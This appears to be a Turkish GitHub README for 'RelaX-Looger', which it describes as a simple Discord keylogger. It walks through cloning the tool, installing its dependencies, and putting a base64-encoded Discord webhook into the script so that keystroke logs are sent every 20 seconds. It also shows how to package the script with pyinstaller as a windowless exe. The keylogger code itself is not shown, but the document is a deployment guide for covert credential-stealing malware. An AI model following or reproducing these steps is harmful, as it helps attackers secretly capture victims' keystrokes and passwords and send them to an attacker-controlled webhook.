# RelaX-Looger
Çok Basit Bir Discord Keylogger

RelaX Logger Tüm Hakları Saklıdır!

## 🔍 〢 Gereksnimler
- Python (Bendeki Sürüm: 3.11.2)
- Bendeki Python Linki: https://www.python.org/ftp/python/3.11.2/python-3.11.2-amd64.exe
  
- Git (Depoyu Klonlamak İçin Ama İsterseniz İndirebilirsinizde)
- (64 Bit) https://github.com/git-for-windows/git/releases/download/v2.43.0.windows.1/Git-2.43.0-64-bit.exe
- (32 Bit) https://github.com/git-for-windows/git/releases/download/v2.43.0.windows.1/Git-2.43.0-32-bit.exe

Öncelikle Selamlar Ben RelaX 

Depoyu Klonlayın Veya İndirin!
Klonlamak İçin Cmd Ye Şu Komutu Yazın!
```
git clone https://github.com/RelaX0001/RelaX-Looger.git
```
Öncelikle İndirdiğiniz Ya'da Klonladığınız RelaX Logger.rar Dosyasını Klasöre Ayıklayın.

Sonra Cmd Yi Açıp Cmd Komutları İle RelaX Logger Ana Dizinine Girin.

Sonra Orada Şu Kodu Çalıştırın

## ⚙️ 〢 Kurulum
```
pip install -r requirements.txt
```
🔴🟢Eğer Pip Kurulu Değilse🔴🟢

Cmd Komut Satırına Şunu Yazın
```
pip install pip
```
Discord'da Bir Sunucu Oluşturup Entegrasyolar'dan Webhook Oluşturun.

Oluşturulan Webhook Tokeni'ni Kopyalayıp

https://www.base64encode.org/ Adresine Gidip Üste Yapıştırıp Encode Deyin.

Sonra Altta Çıkan Base64 Kodunu Kopyalayın.

Ardından RelaX Logger.py Dosyasına Sağ Tıklayıp Txt İle Açın 
```
SEND_REPORT_EVERY = 20 #Buraya Kaç Saniye Aralıkla Log Almak İsterseniz Onu Yazın
WEBHOOK = "" # Tırnak İçine Kopyaladığnız Base 64 Kodunu Yazın.
 ```
Evet Bitti.

🟡[[[Eğer Exe'ye Çevirmek İsterseniz!]]]🟡

1- Cmd Yi Açıp Koutunu Çalıştırın
```
pip install pynput
```

2- Yine Cmd İle RelaX Logger Dosya Dizininin İçinde Şu Kodlardan Birisini Çalıştırın!

🔻🔻🔻[BUNDA CMD AÇILIR]🔻🔻🔻
```
pyinstaller --onefile RelaX.py
```
🔻🔻🔻[BUNDA CMD AÇILMAZ]🔻🔻🔻
```
pyinstaller --onefile --noconsole RelaX.py 
```

## ⚙️ 〢 Kurulum Videosu
https://streamable.com/m9fl7z
## 🔍 〢 Test Edildi:
- Windows 10

Creative Commons 2023-2024

Created By RelaX


